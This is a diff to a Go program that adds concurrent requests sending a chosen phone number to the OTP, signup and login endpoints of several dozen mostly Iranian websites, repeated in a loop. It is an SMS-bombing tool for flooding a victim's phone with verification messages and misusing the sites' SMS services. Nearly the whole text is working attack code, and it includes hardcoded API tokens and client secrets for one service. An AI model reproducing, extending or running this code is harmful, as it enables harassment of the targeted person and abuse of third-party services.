@@ -168,6 +168,405 @@ func main() {
 
 	for i := 0; i < repeatCount; i++ {
 
+
+		// behtarino.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// abantether.com (JSON) - register/phone/send
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// novinbook.com (Form Data) - Note: Verify site: i'm not robot
+		wg.Add(1)
+		formDataNovinbook := url.Values{}
+		formDataNovinbook.Set("phone", phone)
+		formDataNovinbook.Set("call", "yes")
+		go sendFormRequest(ctx, "https://novinbook.com/index.php?route=account/phone", formDataNovinbook, &wg, ch)
+		// azki.com (JSON) - check-login-availability (Duplicate URL base from previous list, keeping as provided)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// pooleno.ir (JSON) - Note: delete site: no Access
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.pooleno.ir/v1/auth/check-mobile", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// agent.wide-app.ir (JSON) - Note: error site: secure connection
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://agent.wide-app.ir/auth/token", map[string]interface{}{
+			"grant_type": "otp",
+			"client_id":  "62b30c4af53e3b0cf100a4a0",
+			"phone":      phone,
+		}, &wg, ch)
+		// api.zarinplus.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.zarinplus.com/user/otp/", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// messengerg2c4.iranlms.ir (JSON) - Note: i don't know ???
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://messengerg2c4.iranlms.ir/", map[string]interface{}{
+			"api_version": "3",
+			"method":      "sendCode",
+			"data": map[string]interface{}{
+				"phone_number": phone,
+				"send_type":    "SMS",
+			},
+		}, &wg, ch)
+		// lms.tamland.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://lms.tamland.ir/api/api/user/signup", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// account.bama.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://account.bama.ir/api/otp/generate/v4", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// ws.alibaba.ir (JSON) - Duplicate, keeping as provided
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://ws.alibaba.ir/api/v3/account/mobile/otp", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// api.bitbarg.com (JSON) - Note: delete site: no Access
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.bitbarg.com/api/v1/authentication/registerOrLogin", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// api.bahramshop.ir (JSON) - Note: error site: secure connection
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.bahramshop.ir/api/user/validate/username", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// api.bitpin.ir (JSON) - Note: Password required
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.bitpin.ir/v1/usr/sub_phone/", map[string]interface{}{
+			"phone": phone, // Corrected payload key
+		}, &wg, ch)
+		// server.kilid.com (JSON) - Note: i don't know ???
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// bit24.cash (JSON) - Duplicate, keeping as provided
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://bit24.cash/auth/api/sso/v2/users/auth/register/send-code", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// app.itoll.ir (JSON) - Duplicate, keeping as provided
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://app.itoll.ir/api/v1/auth/login", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// gw.taaghche.com (JSON) - signup (Duplicate, keeping as provided)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://gw.taaghche.com/v4/site/auth/signup", map[string]interface{}{
+			"contact": phone,
+		}, &wg, ch)
+		// www.namava.ir (JSON) - registrations/by-otp/request (New path)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://www.namava.ir/api/v1.0/accounts/registrations/by-otp/request", map[string]interface{}{
+			"UserName": phone,
+		}, &wg, ch)
+		// application2.billingsystem.ayantech.ir (JSON) - requestActivationCode (Corrected payload)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode", map[string]interface{}{
+			"Parameters": map[string]interface{}{
+				"ApplicationType":      "Web",
+				"ApplicationUniqueToken": nil, // Assuming None means nil in Go
+				"ApplicationVersion":   "1.0.0",
+				"MobileNumber":         phone, // Assuming + is part of the key string, not the value
+			},
+		}, &wg, ch)
+		// application2.billingsystem.ayantech.ir (JSON) - getLoginMethod (New path)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/getLoginMethod", map[string]interface{}{
+			"MobileNumber": phone,
+		}, &wg, ch)
+		// core.pishkhan24.ayantech.ir (JSON) - LoginByOTP (Corrected payload)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://core.pishkhan24.ayantech.ir/webservices/core.svc/v1/LoginByOTP", map[string]interface{}{
+			"Username": phone, // Corrected payload key
+		}, &wg, ch)
+		// simkhanapi.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://simkhanapi.ir/api/users/registerV2", map[string]interface{}{
+			"mobileNumber": phone,
+		}, &wg, ch)
+		// abantether.com (JSON) - register/phone/send (Duplicate URL base, different path/payload)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.abantether.com/api/v2/auths/register/phone/send", map[string]interface{}{
+			"phone_number": phone,
+		}, &wg, ch)
+		// dicardo.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://dicardo.com/sendotp", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// ghasedak24.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://ghasedak24.com/user/otp", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// tikban.com (JSON) - LoginAndRegister (New payload key)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
+			"CellPhone": phone,
+		}, &wg, ch)
+		// tikban.com (JSON) - LoginAndRegister (New payload key)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://tikban.com/Account/LoginAndRegister", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// ketabchi.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://ketabchi.com/api/v1/auth/requestVerificationCodee", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// offdecor.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://www.offdecor.com/index.php?route=account/login/sendCode", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// shahrfarsh.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://shahrfarsh.com/Account/Login", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// takfarsh.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://takfarsh.com/wp-admin/admin-ajax.php", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// accounts.khanoumi.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://accounts.khanoumi.com/account/login/init", map[string]interface{}{
+			"loginIdentifier": phone,
+		}, &wg, ch)
+		// api.rokla.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.rokla.ir/user/request/otp/", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// mashinbank.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://mashinbank.com/api2/users/check", map[string]interface{}{
+			"mobileNumber": phone,
+		}, &wg, ch)
+		// client.api.paklean.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://client.api.paklean.com/download", map[string]interface{}{
+			"tel": phone,
+		}, &wg, ch)
+		// beta.raghamapp.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://beta.raghamapp.com/auth", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// gateway-v2.trip.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://gateway-v2.trip.ir/api/v1/totp/send-to-phone-and-email", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// api.timcheh.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.timcheh.com/auth/otp/send", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// mobogift.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://mobogift.com/signin", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// cinematicket.org (JSON) - otp
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://cinematicket.org/api/v1/users/otp", map[string]interface{}{
+			"phone_number": phone,
+		}, &wg, ch)
+		// cinematicket.org (JSON) - signup
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://cinematicket.org/api/v1/users/signup", map[string]interface{}{
+			"phone_number": phone,
+		}, &wg, ch)
+		// www.irantic.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://www.irantic.com/api/login/authenticate", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// kafegheymat.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// api.snapp.express (JSON) - loginMobileWithNoPass (Duplicate URL, keeping as provided)
+		wg.Add(1)
+		go sendJSONRequest(ctx, fmt.Sprintf("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85"), map[string]interface{}{
+			"cellphone": phone,
+		}, &wg, ch)
+		// www.delino.com (JSON) - user/register
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://www.delino.com/user/register", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// 1401api.tamland.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
+			"Mobile": phone,
+		}, &wg, ch)
+		// shop.opco.co.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", map[string]interface{}{
+			"telephone": phone,
+		}, &wg, ch)
+		// melix.shop (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://melix.shop/site/api/v1/user/otp", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// safiran.shop (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://safiran.shop/login", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// restaurant.delino.com (JSON) - Note: Complex payload
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://restaurant.delino.com/user/register", map[string]interface{}{
+			"apiToken":     "VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq",
+			"clientSecret": "7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq",
+			"device":       "web",
+			"username":     phone,
+		}, &wg, ch)
+		// garcon.tandori.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://garcon.tandori.ir/users/v1/main/login", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// dastkhat-isad.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// irwco.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://irwco.ir/register", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// api.arshiyan.com (JSON) - Note: Complex payload
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.arshiyan.com/send_code", map[string]interface{}{
+			"country_code": "98",
+			"phone_number": phone,
+		}, &wg, ch)
+		// backend.topnoor.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://backend.topnoor.ir/web/v1/user/otp", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// api.alinance.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.alinance.com/user/register/mobile/send/", map[string]interface{}{
+			"phone_number": phone,
+		}, &wg, ch)
+		// api.dadhesab.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.dadhesab.ir/user/entry", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// app.dosma.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://app.dosma.ir/sendverify/", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// api.ehteraman.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.ehteraman.com/api/request/otp", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// api-ebcom.mci.ir (JSON) - Duplicate, keeping as provided
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api-ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
+			"msisdn": phone,
+		}, &wg, ch)
+		// api.hbbs.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.hbbs.ir/authentication/SendCode", map[string]interface{}{
+			"MobileNumber": phone,
+		}, &wg, ch)
+		// api.iranamlaak.net (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", map[string]interface{}{
+			"AgencyMobile": phone,
+		}, &wg, ch)
+		// api.kcd.app (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.kcd.app/api/v1/auth/login", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// mazoocandle.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://mazoocandle.ir/login", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// api.paymishe.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.paymishe.com/api/v1/otp/registerOrLogin", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// api.rayshomar.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.rayshomar.ir/api/Register/RegistrMobile", map[string]interface{}{
+			"MobileNumber": phone,
+		}, &wg, ch)
+		// refahtea.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://refahtea.ir/wp-admin/admin-ajax.php", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// mamifood.org (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
+			"Phone": phone,
+		}, &wg, ch)
+		// server.uphone.ir (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://server.uphone.ir/api/v1/login/otp/request", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
+		// abantether.com (JSON) - users/register/phone/send/ (New path)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://abantether.com/users/register/phone/send/", map[string]interface{}{
+			"phoneNumber": phone,
+		}, &wg, ch)
+		// glite.ir (Form Data) - Note: Complex payload
+		wg.Add(1)
+		formDataGlite := url.Values{}
+		formDataGlite.Set("action", "logini_first")
+		formDataGlite.Set("login", phone)
+		go sendFormRequest(ctx, "https://www.glite.ir/wp-admin/admin-ajax.php", formDataGlite, &wg, ch)
+		// novinbook.com (JSON) - Note: Verify site: i'm not robot (New payload)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://novinbook.com/index.php?route=account/phone", map[string]interface{}{
+			"phone": phone,
+		}, &wg, ch)
+		// api.offch.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.offch.com/auth/otp", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// sandbox.sibbazar.com (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://sandbox.sibbazar.com/api/v1/user/invite", map[string]interface{}{
+			"username": phone,
+		}, &wg, ch)
+		// api.watchonline.shop (JSON)
+		wg.Add(1)
+		go sendJSONRequest(ctx, "https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
+			"mobile": phone,
+		}, &wg, ch)
 		// technolife.com (JSON) - Note: URL has query params
 		wg.Add(1)
 		go sendJSONRequest(ctx, fmt.Sprintf("https://www.technolife.com/_next/data/_Xnjxy3mtSBVgJVep3pDD/account/LoginWithMobileCode.json?backTo=%%2F&backToAction=&mobileNo=%v&request_id=60660888", phone), map[string]interface{}{
